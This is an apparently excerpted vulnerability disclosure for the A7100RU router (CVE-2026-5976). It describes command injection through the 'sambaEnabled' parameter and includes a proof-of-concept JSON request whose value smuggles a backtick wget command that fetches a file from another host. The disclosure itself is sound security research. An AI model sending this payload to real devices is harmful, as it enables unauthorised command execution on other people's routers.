# A7100RU Vulnerability（CVE-2026-5976）
...
In  sub_41F5D0 function, it reads in a user-provided parameter `sambaEnabled` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `sambaEnabled` as **\`wget 192.168.6.1:6666/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setStorageCfg","sambaEnabled":"`wget 192.168.6.1:7777/testpoc`"}
```
